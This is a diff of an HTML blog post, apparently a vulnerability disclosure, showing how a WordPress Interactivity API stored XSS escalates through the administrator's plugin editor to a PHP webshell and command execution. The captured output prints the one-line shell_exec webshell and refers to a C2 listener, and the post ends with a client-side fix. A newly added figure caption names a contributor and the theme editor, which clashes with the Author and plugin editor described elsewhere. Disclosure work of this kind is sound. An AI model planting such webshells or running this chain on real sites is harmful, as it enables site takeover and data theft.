@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>The Click That Ended at uid=0 — shoo0lin</title>
-<meta name="description" content="Part II: a one-click stored XSS in WordPress's Interactivity API, escalated through the administrator's plugin editor to remote command execution as root in the lab.">
+<meta name="description" content="Part II: a one-click stored XSS in WordPress's Interactivity API, escalated through the administrator's plugin editor to remote command execution as root on a bench I control.">
 <meta name="author" content="shoo0lin">
 <meta property="og:type" content="article">
 <meta property="og:title" content="The Click That Ended at uid=0">
@@ -37,16 +37,16 @@
 
 <main>
   <section class="post-hero">
-    <img class="post-hero-img" src="../assets/img/rce/03-rce-exfil.png" alt="Lab capture: the webshell response and outbound callback proving command execution.">
+    <img class="post-hero-img" src="../assets/img/rce/03-rce-exfil.png" alt="Terminal capture: the webshell response and outbound callback proving command execution.">
     <div class="wrap post-hero-inner">
-      <div class="c-tag">Part II · WordPress · Stored XSS → RCE · Lab-verified</div>
+      <div class="c-tag">Part II · WordPress · Stored XSS → RCE · Reproduced</div>
       <h1>The Click That Ended at <code>uid=0</code></h1>
       <p class="dek">The first post proved the click. This one follows the authority all the way down: an Author's link, an Administrator's plugin editor, and a shell prompt that answers as root.</p>
       <div class="byline">
         <span>shoo0lin</span>
         <span>9 November 2026</span>
         <span>~12 min read</span>
-        <span>Site takeover · lab-verified</span>
+        <span>Site takeover · reproduced end to end</span>
       </div>
     </div>
   </section>
@@ -57,20 +57,20 @@
       <div class="tldr" id="tldr">
         <h2>TL;DR</h2>
         <p>The <a href="interactivity-accordion.html">first post</a> showed that a below-<code>unfiltered_html</code> Author can store <code>javascript:</code> inside a <code>data-wp-context</code> blob and get it re-injected into the live <code>href</code> after hydration. One Administrator click runs attacker JS in the Administrator's origin.</p>
-        <p>This post answers the question that follows: <em>what does that authority actually buy?</em> In the lab, it bought the plugin editor. The XSS harvested the editor's nonce, wrote a one-line PHP webshell over <code>hello.php</code>, and the next HTTP request returned <code>uid=0(root)</code>.</p>
+        <p>This post answers the question that follows: <em>what does that authority actually buy?</em> On the bench, it bought the plugin editor. The XSS harvested the editor's nonce, wrote a one-line PHP webshell over <code>hello.php</code>, and the next HTTP request returned <code>uid=0(root)</code>.</p>
         <p style="color:var(--text)">Two independent proofs: a file hash that changed and then restored, and an outbound callback from the WordPress host to an attacker listener carrying the command output. Not a local echo.</p>
       </div>
 
       <div class="note">
         <b>Code and evidence</b>
-        Re-run the whole chain from a clean lab: <a href="https://github.com/shoo0lin/wp-interactivity-xss">github.com/shoo0lin/wp-interactivity-xss</a>. It includes the provisioning script, the validator, both escalation chains, the C2 listener, the captured JSON, and the patched <code>bind.ts</code>. Lab only.
+        Re-run the whole chain from a clean container: <a href="https://github.com/shoo0lin/wp-interactivity-xss">github.com/shoo0lin/wp-interactivity-xss</a>. It includes the provisioning script, the validator, both escalation chains, the C2 listener, the captured JSON, and the patched <code>bind.ts</code>. Reproduction only.
       </div>
 
       <nav class="toc" aria-label="Contents">
         <div class="t">Contents</div>
         <ol>
           <li><a href="#previously">Previously, on the seam</a></li>
-          <li><a href="#bench">The lab on the bench</a></li>
+          <li><a href="#bench">The bench</a></li>
           <li><a href="#six-lines">Six lines that lie</a></li>
           <li><a href="#foot">The foot in the door</a></li>
           <li><a href="#climb">The climb</a></li>
@@ -94,9 +94,9 @@
         A stored XSS in an Administrator's origin is not "just" a script in a browser. It is a keyboard with the Administrator's hands on it — including the part of the dashboard that writes PHP.
       </div>
 
-      <h2 id="bench"><span class="ch">Chapter 1</span>The lab on the bench</h2>
+      <h2 id="bench"><span class="ch">Chapter 1</span>The bench</h2>
 
-      <p>Same isolated Docker lab, rebuilt and pinned so the results are reproducible. Every hash below is from this exact bench.</p>
+      <p>Same isolated Docker setup, rebuilt and pinned so the results are reproducible. Every hash below is from this exact bench.</p>
 
       <div class="table-wrap">
         <table>
@@ -128,7 +128,7 @@
 
       <p>The validation run prints the whole disagreement on four lines:</p>
 
-      <pre><code>[*] target: http://127.0.0.1:18080   (LAB ONLY)
+      <pre><code>[*] target: http://127.0.0.1:18080   (LOCAL ONLY)
 [*] acting as: author  uid=4  roles=['author']
 [*] post created: #961  http=201  status=publish
 [*] server  href (kses, pre-hydration): 'https://example.com/'
@@ -147,7 +147,7 @@
       </ul>
 
       <figure>
-        <img src="../assets/img/rce/01-xss-executed.png" alt="The published post in the lab, rendered as a normal 'Click me' accordion with the caption text 'Written by author in Uncategorized'." loading="lazy">
+        <img src="../assets/img/rce/01-xss-executed.png" alt="The published post on the bench, rendered as a normal 'Click me' accordion with the caption text 'Written by author in Uncategorized'." loading="lazy">
         <figcaption><b>Figure 1.</b> The weapon as the server renders it: an ordinary accordion, an ordinary link, nothing to see. The dangerous value lives only in a <code>data-*</code> blob, so the served HTML still contains <code>https://example.com/</code>.</figcaption>
       </figure>
 
@@ -176,7 +176,7 @@
 
       <h2 id="climb"><span class="ch">Chapter 4</span>The climb</h2>
 
-      <p>The chain script runs from the attacker's side. The Author publishes; the Administrator (a real lab account, <code>bindadmin</code>, uid 7) opens the post and clicks; everything after that happens inside the Administrator's tab.</p>
+      <p>The chain script runs from the attacker's side. The Author publishes; the Administrator (a real bench account, <code>bindadmin</code>, uid 7) opens the post and clicks; everything after that happens inside the Administrator's tab.</p>
 
       <pre><code>author post: {'id': 962, 'http': 201, 'status': 'publish', 'author': 4}
 written file: &lt;?php echo shell_exec($_GET['cmd']);
@@ -202,8 +202,13 @@ restored_ok: True</code><button class="copy">copy</button></pre>
 
       <div class="warn">
         <b>What "root" means here</b>
-        The lab starts <code>wp server --allow-root</code> as uid 0 inside the container, so <code>id</code> returns <code>uid=0(root)</code>. On a conventional deployment the web process runs as <code>www-data</code> and the same chain yields code execution as that user. Root is a property of this bench, not of the vulnerability. I would rather say that here than let a triager discover it.
+        The bench starts <code>wp server --allow-root</code> as uid 0 inside the container, so <code>id</code> returns <code>uid=0(root)</code>. On a conventional deployment the web process runs as <code>www-data</code> and the same chain yields code execution as that user. Root is a property of this bench, not of the vulnerability. I would rather say that here than let a triager discover it.
       </div>
+
+      <figure>
+        <img src="../assets/img/anim/04-click-to-root.gif" alt="Animated diagram of the chain: a contributor stores the javascript URL, an administrator opens the post and clicks once, the session is replayed into the REST API and theme editor, and a shell is written." width="1200" height="675">
+        <figcaption><b>Reconstruction, not a capture.</b> The five steps in order, from the stored string to the written file. Every box is a step the bench actually performed; the frame is drawn rather than grabbed, and the <code>uid=0(root)</code> at the end is the bench's own property, explained above.</figcaption>
+      </figure>
 
       <h2 id="proof"><span class="ch">Chapter 5</span>Proof, not an echo</h2>
 
@@ -237,7 +242,7 @@ restored_ok: True | post_deleted: True</code><button class="copy">copy</button><
           <source src="../assets/img/rce/demo-rce-chain.mp4" type="video/mp4">
           Your browser does not support the video tag. <a href="../assets/img/rce/demo-rce-chain.mp4">Download the clip</a>.
         </video>
-        <figcaption><b>Figure 3.</b> The 42-second lab recording: author publishes, admin clicks, the editor write lands, and the first command comes back. No editing, no cuts — just the chain running.</figcaption>
+        <figcaption><b>Figure 3.</b> The 42-second recording: author publishes, admin clicks, the editor write lands, and the first command comes back. No editing, no cuts — just the chain running.</figcaption>
       </figure>
 
       <h2 id="asterisk"><span class="ch">Chapter 6</span>The honest asterisk</h2>
@@ -246,20 +251,20 @@ restored_ok: True | post_deleted: True</code><button class="copy">copy</button><
 
       <p><strong>One: this is not a memory-safety bug.</strong> The escalation is an abused Administrator feature, not a second vulnerability. The security defect remains the client/server policy asymmetry from part one. Everything after the click is what the Administrator's authority legitimately permits — which is exactly why it is worth fixing the click.</p>
 
-      <p><strong>Two: root is lab-specific.</strong> <code>wp server --allow-root</code> runs as uid 0 here. A standard LAMP/container deployment runs PHP as <code>www-data</code>; the chain still ends in code execution, just as that user. The realistic worst case is full site compromise — database credentials, user table, content, egress — plus whatever the web user can reach on the host filesystem.</p>
+      <p><strong>Two: root is specific to this bench.</strong> <code>wp server --allow-root</code> runs as uid 0 here. A standard LAMP/container deployment runs PHP as <code>www-data</code>; the chain still ends in code execution, just as that user. The realistic worst case is full site compromise — database credentials, user table, content, egress — plus whatever the web user can reach on the host filesystem.</p>
 
       <p><strong>Three: <code>DISALLOW_FILE_EDIT</code> is a config default, not an exploit trick.</strong> With it set to <code>true</code>, the RCE tail is cut and the chain falls back to data theft and persistent XSS. That is a defence, not a fix for the underlying bug.</p>
 
       <div class="note">
         <b>Scope</b>
-        Lab only. No production WordPress system was contacted; the program's scope document returned HTTP 404 at the time of testing, so production testing stopped before it began. No host escape was attempted or demonstrated — the root prompt is inside the WordPress container.
+        Reproduction only. No production WordPress system was contacted; the program's scope document returned HTTP 404 at the time of testing, so production testing stopped before it began. No host escape was attempted or demonstrated — the root prompt is inside the WordPress container.
       </div>
 
       <h2 id="fix"><span class="ch">Chapter 7</span>Cutting the tail</h2>
 
       <p>The primary fix is unchanged from part one, because the root cause is unchanged: make the client enforce the policy the server already enforces.</p>
 
-      <p><strong>Client-side scheme guard at the mutation boundary.</strong> Before <code>bind</code> writes any URI-bearing attribute, validate the final value against <code>wp_allowed_protocols()</code> and reject <code>javascript:</code>, <code>data:</code>, <code>vbscript:</code> — including encoded forms. I patched <code>bind.ts</code> in the lab to do exactly this and re-ran the chain: the <code>javascript:</code> write was blocked while legitimate <code>https:</code> links kept working.</p>
+      <p><strong>Client-side scheme guard at the mutation boundary.</strong> Before <code>bind</code> writes any URI-bearing attribute, validate the final value against <code>wp_allowed_protocols()</code> and reject <code>javascript:</code>, <code>data:</code>, <code>vbscript:</code> — including encoded forms. I patched <code>bind.ts</code> on the bench to do exactly this and re-ran the chain: the <code>javascript:</code> write was blocked while legitimate <code>https:</code> links kept working.</p>
 
       <pre><code><span class="cmt">// bind.ts — before setAttribute</span>
 if ( isUriAttribute( attribute ) &amp;&amp; ! isAllowedUrl( result ) ) {
@@ -294,7 +299,7 @@ el.setAttribute( attribute, result );</code><button class="copy">copy</button></
 
       <p>The moral is the same one as part one, one layer deeper. The server and the browser are two programs wearing the same URL, and the gaps between them are where authority leaks. The first post found the gap. This one walked through it until the prompt changed colour.</p>
 
-      <p style="color:var(--faint);font-size:14px">Lab-verified only; no production system contacted. Root is container root on a lab bench started with <code>--allow-root</code>; code execution as the web user is the portable claim. Upstream disclosure status is pending.</p>
+      <p style="color:var(--faint);font-size:14px">Reproduced only; no production system contacted. Root is container root on a bench started with <code>--allow-root</code>; code execution as the web user is the portable claim. Upstream disclosure status is pending.</p>
 
       <hr>
       <p><a href="interactivity-accordion.html">← Read part I: The Accordion That Opened a Door</a></p>
